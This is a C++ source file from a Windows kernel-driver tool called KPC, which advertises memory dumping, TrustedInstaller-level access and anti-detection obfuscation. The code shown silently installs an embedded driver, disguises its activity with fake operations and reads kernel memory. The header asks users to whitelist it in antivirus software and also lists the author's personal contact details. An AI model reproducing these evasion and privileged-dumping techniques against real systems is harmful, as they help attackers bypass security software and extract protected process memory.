/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "Controller.h"
#include "common.h"
#include <algorithm>
#include "resource.h"

extern volatile bool g_interrupted;

// ======================= Constructor & Destructor =======================
Controller::Controller() : m_rtc(std::make_unique<kvc>()), m_of(std::make_unique<OffsetFinder>()) {
    if (!m_of->FindAllOffsets()) {
        ERROR(OBFERR(L"Failed to find required kernel structure offsets").c_str());
    }
    // Note: Driver is loaded on-demand for each operation (atomic pattern)
}

Controller::~Controller() {
    // Ensure clean shutdown with proper driver cleanup
    // (Atomic operations handle their own cleanup)
}

// ======================= Atomic Operation Management System =======================

bool Controller::PerformAtomicCleanup() noexcept {
    // Step 1: CRITICAL - Close device handle before unloading driver to prevent BSOD
    if (m_rtc) {
        m_rtc->Cleanup();
    }
    
    // Step 2: Force handle flush - allow kernel time for cleanup
    Sleep(150);
    
    // Step 3: Stop driver service gracefully
    if (!StopDriverService()) {
        ERROR(OBFERR(L"Failed to stop driver service during cleanup").c_str());
    }
    
    // Step 4: CRITICAL - Verify service actually stopped before uninstall
    bool serviceVerified = false;
    if (InitDynamicAPIs()) {
        for(int attempt = 0; attempt < 15; attempt++) {
            SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
            if (hSCM) {
                SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_QUERY_STATUS);
                if (hService) {
                    SERVICE_STATUS status;
                    if (QueryServiceStatus(hService, &status)) {
                        if (status.dwCurrentState == SERVICE_STOPPED) {
                            serviceVerified = true;
                            CloseServiceHandle(hService);
                            CloseServiceHandle(hSCM);
                            break;
                        }
                    }
                    CloseServiceHandle(hService);
                } else {
                    // Service doesn't exist means it's stopped
                    serviceVerified = true;
                    CloseServiceHandle(hSCM);
                    break;
                }
                CloseServiceHandle(hSCM);
            }
            Sleep(100);  // Wait before next verification attempt
        }
    }
    
    // Step 5: Verify device handle is completely closed
    for(int attempt = 0; attempt < 10; attempt++) {
        auto devicePrefix = OBFPATH(L"\\\\.\\");
        auto devicePath = devicePrefix + GetServiceName();
        HANDLE testHandle = CreateFileW(devicePath.c_str(), 
                                      GENERIC_READ, 0, nullptr, 
                                      OPEN_EXISTING, 0, nullptr);
        if (testHandle == INVALID_HANDLE_VALUE) {
            // Driver device inaccessible - cleanup successful
            break;
        }
        CloseHandle(testHandle);
        Sleep(100);
    }
    
    // Step 6: Only uninstall if service is verified stopped
    if (serviceVerified) {
        UninstallDriver();
    }
    
    // Step 7: Extra delay before recreating instance - CRITICAL for stability
    Sleep(300);
    
    // Step 8: Recreate driver instance for next operation
    m_rtc = std::make_unique<kvc>();
    
    SUCCESS(OBFSUCCESS(L"Departed from kernel mode (Ring 0), returned to user space").c_str());
    return true;
}

bool Controller::PerformAtomicInit() noexcept {
    // Load and initialize driver for atomic operation
    if (!EnsureDriverAvailable()) {
        ERROR(OBFERR(L"Failed to load driver for atomic operation").c_str());
        return false;
    }
    
    return true;
}

bool Controller::PerformAtomicInitWithErrorCleanup() noexcept {
    if (!PerformAtomicInit()) {
        PerformAtomicCleanup();
        return false;
    }
    return true;
}

// ======================= Core Driver Management System =======================

bool Controller::EnsureDriverAvailable() noexcept {
    if (m_rtc->Initialize()) {
        auto testRead = m_rtc->Read32(0x1000);
        if (testRead.has_value() || GetLastError() != ERROR_FILE_NOT_FOUND) {
            return true;
        }
    }
	
	if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_QUERY_STATUS | SERVICE_START);
        if (hService) {
            SERVICE_STATUS status;
            if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
                g_pStartServiceW(hService, 0, nullptr);
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                Sleep(500);
                if (m_rtc->Initialize()) {
                    return true;
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
	std::wstring driverPath = GetDriverStorePath() + OBFPATH(L"\\") + GetDriverFileName();
	if (GetFileAttributesW(driverPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
		if (RegisterDriverServiceSilent(driverPath) && StartDriverServiceSilent()) {
			if (m_rtc->Initialize()) {
				return true;
			}
		}
	}
    INFO(OBFINFO(L"Initializing kernel driver component...").c_str());
    
    if (!InstallDriverSilently()) {
        ERROR(OBFERR(L"Failed to install kernel driver component").c_str());
        return false;
    }

    if (!StartDriverServiceSilent()) {
        ERROR(OBFERR(L"Failed to start kernel driver service").c_str());
        return false;
    }

    if (!m_rtc->Initialize()) {
        ERROR(OBFERR(L"Failed to initialize kernel driver communication").c_str());
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Kernel driver component initialized successfully").c_str());
    return true;
}

// ======================= Driver Status Checking =======================

bool Controller::IsDriverCurrentlyLoaded() noexcept {
    if (!m_rtc) return false;
    
    // Check if device handle is open and functional
    if (!m_rtc->IsConnected()) return false;
    
    // Additional test - attempt read from safe memory address
    auto testRead = m_rtc->Read32(0x1000);
    return testRead.has_value() || GetLastError() != ERROR_FILE_NOT_FOUND;
}